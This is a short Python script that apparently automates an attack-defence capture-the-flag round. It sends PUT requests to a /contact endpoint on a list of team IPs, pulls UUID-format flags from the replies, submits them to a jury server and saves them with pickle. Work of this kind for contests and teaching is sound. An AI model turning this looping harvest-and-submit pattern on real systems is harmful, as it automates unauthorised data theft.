#!/usr/bin/env python3

from sys import argv, exit
from time import sleep, strftime
from traceback import print_exc
import pickle
import requests as r
import re

if len(argv) < 4:
    print("Usege: {0} jury_addr teamid ip_attack1 [ip_attack...]".format(argv[0]))
    exit(1)

jury_url = "http://{0}/flag?teamid={1}&flag=".format(argv[1], argv[2])
attack_ip = argv[3:]
print(attack_ip)
delay = 0.5

if len(attack_ip) == 0:
    exit(1)

# save_flags = []
flags = set()
try: 
    with open("flags.pickle", "rb") as saved:
        flags = pickle.load(saved)
except:
    pass

try:
    while True:
        for ip in attack_ip:
            # сама атака
            ans = r.put("http://" + ip + "/contact")
            if ans.status_code != 200:
                print(ip + " failed")
                attack_ip.remove(ip)
            for flag in re.findall("[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", ans.text):
                if flag not in flags:
                    flags.add(flag)
                    # сдача флага
                    ans = r.get(jury_url + flag)
                    print('[', strftime("%H:%M:%S"), "]{", ip, "} ", flag, "-> code: ", ans.status_code, "; ans = ", ans.text)
                    sleep(delay)
except KeyboardInterrupt:
    print("KeyboardInterrupt")
except InterruptedError:
    print("InterruptedError")
except:
    print("====================================")
    print("The program ended with an exception")
    print_exc()
    print("====================================")
finally:
    with open("flags.pickle", "wb") as saving:
        pickle.dump(flags, saving)
        print("Flags saved!!")